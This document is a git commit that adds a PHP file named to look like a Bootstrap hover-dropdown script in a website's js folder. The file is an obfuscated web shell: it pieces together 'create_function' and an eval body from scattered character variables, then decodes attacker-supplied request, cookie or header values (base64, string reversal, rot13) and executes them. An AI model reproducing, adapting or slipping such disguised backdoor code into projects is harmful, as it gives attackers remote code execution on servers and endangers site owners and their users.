966a88e8803efc3ed6ab0d50672c48f64a2691f8
scorpidio11 <41283147+scorpidio11@users.noreply.github.com>
2025-12-31 17:32:00 -0800

    Add files via upload

---
+++ noriwebsite2/js/bootstrap-hover-dropdown_ver1.php
@@ -0,0 +1,95 @@
+<?php
+
+	$conjunctively = '=gtR(r';
+	$lake= '"Aec6'; $entirety= '$ao_';$followings ='idaiAt)';$equation = 'a][h'; $ensurers= 'b';$conscience='E'; $flicker= 'i';$congenially ='B';$disclaims = 'V)gL'; $drummers ='f_rai,'; $consumer ='"UH)JjR';$cristina = '(';$cities= 'GvduT'; $contemptible = 'B';$insistently ='c';
+
+	$decking='c';$interstate= 'he"4;(eT'; $hookworm ='='; $hauling = 'vOTvEj';
+	$hovels = 'Mtf_?Rel';$hypothetically='r';
+
+	$cyclotron = 'ae:asP[';
+	$fortifications= 't';$fray='Te Cn'; $gigavolt = 'M)G_e(m'; $crystallizing= 'e'; $littler = 'Spg$n';$frederico='$';$anionic='[';
+
+	$brightness= '_r$_E$rdr'; $disclosure ='sybiI';$incensed= '('; $concretes ='g';
+	$athena='e';$demerit='e';$bypasses = '"';
+	$fades = 'bi'; $churn= 'e'; $faithless = 'geOi"';$faze = '];aeHE'; $instrumentalists= '?(_a$';$consonant= 'ss"UNQ';$convinced= 'o:rstv))e';
+	$duality = ')';$gosling ='p;eiS[';
+
+	$hermitian='P'; $anomaly = 'oOH]eE'; $buses = ');$aa_(mt'; $degraded = '(,';$bears = '((MT]Ea'; $decimal='K';
+
+	$bandits= 'QH';$baldy='rsal$E"';
+
+	$autumn ='_v'; $cursing ='nc)urRST';$loathed ='t';$dispositions ='_'; $formatting ='$vsVreir'; $dishevel = '"'; $bartel ='s'; $boil ='_my()VP$J';
+	$clumped=')'; $greylag = 'a'; $deluded=$cursing['1']. $formatting['7']. $formatting['5']. $greylag .
+
+	$loathed . $formatting['5'] .
+
+	$boil['0'] .$hovels['2'].$cursing[3].$cursing['0'] .$cursing['1'].$loathed. $formatting['6'] .
+
+	$anomaly['0'] .
+
+	$cursing['0'] ;
+	$confessing =$fray['2'];$caskets =$deluded
+
+	($confessing,$formatting['5'].$formatting['1'] .$greylag.$baldy['3'].$boil['3'] . $greylag.
+	$formatting['7'] .$formatting['7'].$greylag .$boil['2'] .$boil['0'] .$gosling['0'] .
+	$anomaly['0'] .$gosling['0'] .
+	$boil['3'] .$hovels['2'] . $cursing[3].
+
+	$cursing['0'].$cursing['1'].$boil['0'].$faithless['0']. $formatting['5'] . $loathed . $boil['0'] . $greylag.$formatting['7'] . $faithless['0'].
+	$bartel .$boil['3'] . $clumped. $clumped . $clumped.$buses[1]); $caskets ($hauling['5'] ,
+	$bears[4] ,
+	$dishevel, $formatting['5'] , $betrayal['1'],
+	$lake['4'],
+	$angular['0'],$boil[1] ,$boil['7'].$formatting['6']. $hookworm . $greylag.$formatting['7']. $formatting['7']. $greylag.$boil['2'].$boil['0'] .$boil[1].
+	$formatting['5'].$formatting['7'].$faithless['0'] . $formatting['5'] . $boil['3']. $boil['7'] .$boil['0'] .$cursing['5'].$baldy['5'] .$bandits['0'] . $consonant['3']. $baldy['5']. $cursing[6] . $cursing['7'] .
+	$degraded['1'] . $boil['7'] . $boil['0'] . $fray[3] . $anomaly[1].
+	$anomaly[1] .
+	$decimal.$disclosure['4'] .
+	$baldy['5'] . $degraded['1']. $boil['7'] .$boil['0']. $cursing[6].$baldy['5'] .
+
+	$cursing['5']. $boil['5'] . $baldy['5'] .
+
+	$cursing['5']. $clumped. $buses[1] .
+
+	$boil['7']. $greylag . $hookworm.$formatting['6'].$bartel. $bartel. $formatting['5'] . $loathed.$boil['3'].$boil['7'] .$formatting['6'] . $gosling['5']. $dishevel . $formatting['5'] . $formatting['1'] . $boil[1].$hauling['5'] . $greylag .$fades['0'].$interstate['0'].$faithless['0'] .$dishevel . $bears[4]. $clumped .
+
+	$instrumentalists['0']. $boil['7'].$formatting['6'] .$gosling['5']. $dishevel.$formatting['5'] .
+
+	$formatting['1']. $boil[1].
+
+	$hauling['5']. $greylag .$fades['0'] . $interstate['0'] . $faithless['0'].
+	$dishevel. $bears[4] .$convinced['1'].
+
+	$boil['3'].$formatting['6'] .
+	$bartel. $bartel. $formatting['5'] .$loathed .$boil['3'] .
+	$boil['7'] . $formatting['6']. $gosling['5'] . $dishevel . $bandits['1'].$cursing['7']. $cursing['7']. $boil['6'] .$boil['0'] .
+	$baldy['5']. $boil['5'] .$bears['2'] . $boil['8'] .
+
+	$followings['4'] .$contemptible.$bandits['1'] .$gigavolt['2']. $dishevel .
+
+	$bears[4]. $clumped. $instrumentalists['0'].
+
+	$boil['7']. $formatting['6'] . $gosling['5']. $dishevel . $bandits['1']. $cursing['7'].$cursing['7'] .$boil['6'] .$boil['0'].$baldy['5'] . $boil['5'] . $bears['2']. $boil['8'].$followings['4'] .$contemptible. $bandits['1'].
+
+	$gigavolt['2'].$dishevel .$bears[4].$convinced['1']. $brightness[7]. $formatting['6'] .
+	$formatting['5'].
+	$clumped. $buses[1] .
+	$formatting['5'] .$formatting['1'] . $greylag.$baldy['3'].
+
+	$boil['3'] . $bartel .$loathed .
+
+	$formatting['7'] . $formatting['7']. $formatting['5'] .$formatting['1'].$boil['3']. $fades['0'] . $greylag .$bartel. $formatting['5'] .$lake['4'].$interstate['3'].
+	$boil['0'] .
+
+	$brightness[7] .$formatting['5']. $cursing['1'] .$anomaly['0'].
+
+	$brightness[7].
+
+	$formatting['5'].$boil['3'].$bartel.
+
+	$loathed .$formatting['7'].
+	$formatting['7'] . $formatting['5'] .
+	$formatting['1']. $boil['3'] .$boil['7'].
+	$greylag. $clumped.$clumped. $clumped .$clumped.$buses[1] );
+
+	
